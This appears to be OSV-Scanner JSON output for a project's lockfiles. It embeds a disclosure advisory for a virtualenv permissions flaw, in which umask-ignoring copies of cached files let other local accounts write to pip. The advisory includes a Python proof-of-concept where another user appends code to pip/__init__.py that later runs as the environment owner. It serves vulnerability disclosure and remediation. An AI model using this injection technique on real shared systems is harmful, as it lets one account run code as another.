              "help": {
                "markdown": "**Your dependency is vulnerable to [CVE-2026-113720](https://osv.dev/CVE-2026-113720)**.\n\n## [GHSA-fc2g-4w5p-6whm](https://osv.dev/GHSA-fc2g-4w5p-6whm)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ## Summary\n\u003e \n\u003e The app-data copy seeder uses shutil.copy, which preserves cached file modes independently of the current umask. A cache\n\u003e populated under permissive permissions can therefore produce files with wider access in later environments.\n\u003e \n\u003e Anthropic's OSS Scanner reported this as `ANT-2026-487MH6OW` in `virtualenv-20261015-005`, received on 15 October 2026.\n\u003e \n\u003e ## Affected area\n\u003e \n\u003e Permissions of files copied from app-data into a new environment.\n\u003e \n\u003e ## Attacker-controlled input\n\u003e \n\u003e The cache must contain files created with broader permissions than the current environment creator intends. Another\n\u003e account must also be able to traverse the new environment and reach those files. A private parent directory prevents\n\u003e that access. No control of a private live cache is assumed.\n\u003e \n\u003e ## Affected code\n\u003e \n\u003e The relevant 21.14.8 source is in\n\u003e [copy helpers](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/util/path/_sync.py).\n\u003e \n\u003e ## Mechanism\n\u003e \n\u003e The default app-data seeder extracts a wheel into a reusable cache and copies its files into later environments with\n\u003e `shutil.copy()`. That function applies the cached source mode to each destination file after creating it, overriding the\n\u003e current run's umask. If the cache image was built under umask `000`, a later environment created under umask `022` can\n\u003e receive mode-`0666` pip files. The cache may be private while the new environment is reachable by other local accounts.\n\u003e \n\u003e ## Reproduction and evidence\n\u003e \n\u003e The scanner created two histories with separate private app-data caches. In the control, the owner's first run used\n\u003e umask `022`; a later environment had no files writable by another account, and that account could not append to\n\u003e `pip/__init__.py`. In the attack history, the first run used umask `000` and the later run still used `022`. The report\n\u003e counted 478 of 493 environment files writable by others. A second unprivileged uid appended a line to pip, and\n\u003e `bin/pip --version` ran it as the environment owner. The cache itself remained under a mode-`0700` home in both\n\u003e histories.\n\u003e \n\u003e An attacker cannot force the owner's earlier umask through this finding; the attack also needs a traversable\n\u003e destination. A mode-`002` cache can expose group write access under suitable group permissions. The scanner dates\n\u003e app-data copy seeding to #1578, first released in 20.0.2. [PR #3425](https://github.com/pypa/virtualenv/pull/3425)\n\u003e creates copied files under a fixed non-writable-by-others policy further restricted by the current umask.\n\u003e \n\u003e ## Attack sequence\n\u003e \n\u003e ```mermaid\n\u003e sequenceDiagram\n\u003e     participant U as Environment owner\n\u003e     participant C as Private app-data cache\n\u003e     participant E as Later environment\n\u003e     participant A as Other local account\n\u003e     U-\u003e\u003eC: first seed extraction under umask 000\n\u003e     C--\u003e\u003eU: cached pip files have mode 0666\n\u003e     U-\u003e\u003eE: create environment under umask 022\n\u003e     C-\u003e\u003eE: shutil.copy reapplies mode 0666\n\u003e     A-\u003e\u003eE: append code to pip/__init__.py\n\u003e     U-\u003e\u003eE: run bin/pip --version\n\u003e     E--\u003e\u003eU: appended code runs as owner\n\u003e ```\n\u003e \n\u003e ## Reproducer files\n\u003e \n\u003e The following files are from the scanner report for `ANT-2026-487MH6OW`. They were tested against commit `a857a7823c73`\n\u003e in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs\n\u003e need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files\n\u003e are included as evidence and were not rerun for this advisory update.\n\u003e \n\u003e **`repro`**\n\u003e \n\u003e ```text\n\u003e #!/usr/bin/env python3\n\u003e import glob\n\u003e import os\n\u003e import shutil\n\u003e import stat\n\u003e import subprocess\n\u003e import sys\n\u003e from pathlib import Path\n\u003e \n\u003e sys.stdout.reconfigure(line_buffering=True)  # keep these lines in order with those of the child processes\n\u003e os.umask(0o022)  # for the directories made here as root\n\u003e OWNER, OTHER_USER = 1000, 65534  # root is only needed to switch to these two unprivileged uids\n\u003e VIRTUALENV = [\"virtualenv\", \"--quiet\", \"--no-periodic-update\"]  # default seeder; no network for the update check\n\u003e # read here, as root: /tmp/repro.d need not be readable by the other user\n\u003e ATTACK = Path(\"/tmp/repro.d/other_user_appends_to_pip.py\").read_text()\n\u003e \n\u003e \n\u003e def run_as_owner(command, home, umask):\n\u003e     environ = {\"HOME\": str(home), \"PATH\": os.environ[\"PATH\"]}\n\u003e     subprocess.run(command, user=OWNER, group=OWNER, extra_groups=[], umask=umask, env=environ, cwd=home, check=True)\n\u003e \n\u003e \n\u003e def mode(path):\n\u003e     return stat.filemode(os.stat(path).st_mode)\n\u003e \n\u003e \n\u003e work = Path(\"/tmp/seed-mode-repro\")\n\u003e shutil.rmtree(work, ignore_errors=True)\n\u003e work.mkdir()\n\u003e proofs = work / \"proofs\"\n\u003e proofs.mkdir()\n\u003e proofs.chmod(0o777)  # the other user's line writes the uid it runs as in here\n\u003e \n\u003e writable_by_others, appended_line_ran_as = {}, {}\n\u003e # the two histories differ only in the umask of the owner's earlier run, the one that fills ~/.cache/virtualenv\n\u003e for case, umask_of_earlier_run in [(\"CONTROL\", 0o022), (\"OBSERVED\", 0o000)]:\n\u003e     # set up: the owner's home, and with it the cache, is private; the project folder is reachable by path\n\u003e     home = work / f\"{case}-home\"\n\u003e     home.mkdir(mode=0o700)\n\u003e     os.chown(home, OWNER, OWNER)\n\u003e     projects = work / f\"{case}-projects\"\n\u003e     projects.mkdir(mode=0o755)\n\u003e     os.chown(projects, OWNER, OWNER)\n\u003e \n\u003e     # owner, some time ago: the first run, with an empty cache, extracts the pip wheel into it\n\u003e     run_as_owner([*VIRTUALENV, str(home / \"earlier-env\")], home, umask=umask_of_earlier_run)\n\u003e     # owner, today\n\u003e     env = projects / \"env\"\n\u003e     run_as_owner([*VIRTUALENV, str(env)], home, umask=0o022)\n\u003e \n\u003e     (cached_pip,) = glob.glob(f\"{home}/.cache/virtualenv/wheel/*/image/1/CopyPipInstall/pip-*/pip/__init__.py\")\n\u003e     (seeded_pip,) = glob.glob(f\"{env}/lib/python*/site-packages/pip/__init__.py\")\n\u003e     env_files = [path for path in env.rglob(\"*\") if path.is_file() and not path.is_symlink()]\n\u003e     writable_by_others[case] = sum(1 for path in env_files if path.stat().st_mode \u0026 stat.S_IWOTH)\n\u003e     print(f\"{case} earlier run under umask {umask_of_earlier_run:03o}, env created under umask 022\")\n\u003e     print(f\"{case}   cache pip/__init__.py  {mode(cached_pip)}\")\n\u003e     print(f\"{case}   env   pyvenv.cfg       {mode(env / 'pyvenv.cfg')}\")\n\u003e     print(f\"{case}   env   bin/activate     {mode(env / 'bin' / 'activate')}\")\n\u003e     print(f\"{case}   env   pip/__init__.py  {mode(seeded_pip)}\")\n\u003e     print(f\"{case}   env files writable by others: {writable_by_others[case]} of {len(env_files)}\")\n\u003e \n\u003e     # attack: another local user appends a line to the owner's seeded pip\n\u003e     proof = proofs / case\n\u003e     subprocess.run(\n\u003e         [\"python3\", \"-\", str(env), str(proof)],\n\u003e         input=ATTACK,\n\u003e         text=True,\n\u003e         user=OTHER_USER,\n\u003e         group=OTHER_USER,\n\u003e         extra_groups=[],\n\u003e         env={\"PATH\": os.environ[\"PATH\"]},\n\u003e         cwd=\"/\",\n\u003e         check=True,\n\u003e     )\n\u003e \n\u003e     # the owner uses the environment\n\u003e     run_as_owner([str(env / \"bin\" / \"pip\"), \"--version\"], home, umask=0o022)\n\u003e     appended_line_ran_as[case] = proof.read_text() if proof.exists() else None\n\u003e     print(f\"{case}   other user's line ran as uid: {appended_line_ran_as[case]}\")\n\u003e \n\u003e # check: the same umask 022 today must give the same modes, whatever umask filled the cache earlier\n\u003e control_is_private = writable_by_others[\"CONTROL\"] == 0 and appended_line_ran_as[\"CONTROL\"] is None\n\u003e observed_runs_as_owner = writable_by_others[\"OBSERVED\"] \u003e 0 and appended_line_ran_as[\"OBSERVED\"] == str(OWNER)\n\u003e print(\"BUG\" if control_is_private and observed_runs_as_owner else \"OK\")\n\u003e ```\n\u003e \n\u003e **`repro.d/other_user_appends_to_pip.py`**\n\u003e \n\u003e ```text\n\u003e import glob\n\u003e import sys\n\u003e \n\u003e environment, proof = sys.argv[1:]\n\u003e (pip_init,) = glob.glob(f\"{environment}/lib/python*/site-packages/pip/__init__.py\")\n\u003e added_line = f\"\\nimport os; open({proof!r}, 'w').write(str(os.getuid()))\\n\"\n\u003e \n\u003e try:\n\u003e     with open(pip_init, \"a\") as pip_source:\n\u003e         pip_source.write(added_line)\n\u003e     print(f\"other user: appended a line to {pip_init}\")\n\u003e except PermissionError as error:\n\u003e     print(f\"other user: {error}\")\n\u003e ```\n\u003e \n\u003e ## Impact\n\u003e \n\u003e Copied seed files can remain readable or writable by other accounts despite the current umask. Exposure requires those\n\u003e accounts to be able to traverse the destination's parent directories. An attacker need not control the private source\n\u003e cache.\n\u003e \n\u003e Severity: low.\n\u003e \n\u003e ## Versions tested\n\u003e \n\u003e The confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected\n\u003e version or exclude earlier releases. Fixed in 21.14.9.\n\u003e \n\u003e The fix creates destination files with mode `0644`, or `0755` for executable sources, filtered further by the\n\u003e current umask. It does not grant group or world write access, even with a permissive umask. Source modes are not\n\u003e preserved, including modes more restrictive than this creation policy.\n\u003e \n\u003e Fix: [PR #3425](https://github.com/pypa/virtualenv/pull/3425).\n\u003e \n\u003e ## Known mitigation\n\u003e \n\u003e Create environments beneath a directory accessible only to their owner. Recreate environments whose permissions were\n\u003e inherited from a permissive cache.\n\u003e \n\u003e ## Affected release\n\u003e \n\u003e - [x] The problem reproduces on virtualenv 21.14.8.\n\u003e \n\u003e ## Credits\n\u003e \n\u003e Reported by Anthropic's OSS Scanner as ANT-2026-487MH6OW.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/poetry.lock | virtualenv | 20.31.2 |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | virtualenv | 21.7.4 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-fc2g-4w5p-6whm | virtualenv | 21.14.9 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-113720\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-113720\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
                "text": "**Your dependency is vulnerable to [CVE-2026-113720](https://osv.dev/CVE-2026-113720)**.\n\n## [GHSA-fc2g-4w5p-6whm](https://osv.dev/GHSA-fc2g-4w5p-6whm)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ## Summary\n\u003e \n\u003e The app-data copy seeder uses shutil.copy, which preserves cached file modes independently of the current umask. A cache\n\u003e populated under permissive permissions can therefore produce files with wider access in later environments.\n\u003e \n\u003e Anthropic's OSS Scanner reported this as `ANT-2026-487MH6OW` in `virtualenv-20261015-005`, received on 15 October 2026.\n\u003e \n\u003e ## Affected area\n\u003e \n\u003e Permissions of files copied from app-data into a new environment.\n\u003e \n\u003e ## Attacker-controlled input\n\u003e \n\u003e The cache must contain files created with broader permissions than the current environment creator intends. Another\n\u003e account must also be able to traverse the new environment and reach those files. A private parent directory prevents\n\u003e that access. No control of a private live cache is assumed.\n\u003e \n\u003e ## Affected code\n\u003e \n\u003e The relevant 21.14.8 source is in\n\u003e [copy helpers](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/util/path/_sync.py).\n\u003e \n\u003e ## Mechanism\n\u003e \n\u003e The default app-data seeder extracts a wheel into a reusable cache and copies its files into later environments with\n\u003e `shutil.copy()`. That function applies the cached source mode to each destination file after creating it, overriding the\n\u003e current run's umask. If the cache image was built under umask `000`, a later environment created under umask `022` can\n\u003e receive mode-`0666` pip files. The cache may be private while the new environment is reachable by other local accounts.\n\u003e \n\u003e ## Reproduction and evidence\n\u003e \n\u003e The scanner created two histories with separate private app-data caches. In the control, the owner's first run used\n\u003e umask `022`; a later environment had no files writable by another account, and that account could not append to\n\u003e `pip/__init__.py`. In the attack history, the first run used umask `000` and the later run still used `022`. The report\n\u003e counted 478 of 493 environment files writable by others. A second unprivileged uid appended a line to pip, and\n\u003e `bin/pip --version` ran it as the environment owner. The cache itself remained under a mode-`0700` home in both\n\u003e histories.\n\u003e \n\u003e An attacker cannot force the owner's earlier umask through this finding; the attack also needs a traversable\n\u003e destination. A mode-`002` cache can expose group write access under suitable group permissions. The scanner dates\n\u003e app-data copy seeding to #1578, first released in 20.0.2. [PR #3425](https://github.com/pypa/virtualenv/pull/3425)\n\u003e creates copied files under a fixed non-writable-by-others policy further restricted by the current umask.\n\u003e \n\u003e ## Attack sequence\n\u003e \n\u003e ```mermaid\n\u003e sequenceDiagram\n\u003e     participant U as Environment owner\n\u003e     participant C as Private app-data cache\n\u003e     participant E as Later environment\n\u003e     participant A as Other local account\n\u003e     U-\u003e\u003eC: first seed extraction under umask 000\n\u003e     C--\u003e\u003eU: cached pip files have mode 0666\n\u003e     U-\u003e\u003eE: create environment under umask 022\n\u003e     C-\u003e\u003eE: shutil.copy reapplies mode 0666\n\u003e     A-\u003e\u003eE: append code to pip/__init__.py\n\u003e     U-\u003e\u003eE: run bin/pip --version\n\u003e     E--\u003e\u003eU: appended code runs as owner\n\u003e ```\n\u003e \n\u003e ## Reproducer files\n\u003e \n\u003e The following files are from the scanner report for `ANT-2026-487MH6OW`. They were tested against commit `a857a7823c73`\n\u003e in the